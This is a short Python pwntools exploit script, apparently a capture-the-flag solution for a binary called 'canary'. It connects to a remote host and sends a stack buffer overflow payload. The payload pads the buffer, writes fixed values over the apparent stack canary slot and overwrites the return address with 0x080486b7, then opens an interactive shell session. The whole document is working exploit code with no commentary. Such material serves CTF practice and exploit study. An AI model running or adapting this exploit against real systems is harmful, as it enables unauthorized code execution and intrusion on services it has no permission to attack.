from pwn import *

#p = process("./canary")
p = remote("18.222.227.1", 12345)
def exp():
#	pause()
	payload = "A"*0x28
	payload += p32(0)
	payload += p32(1)
	payload += "A"*(0x34-len(payload))
	payload += "AAAA"
	payload += p32(0x080486b7)

	p.sendline(payload)
	p.interactive()

if __name__=='__main__':
	exp()
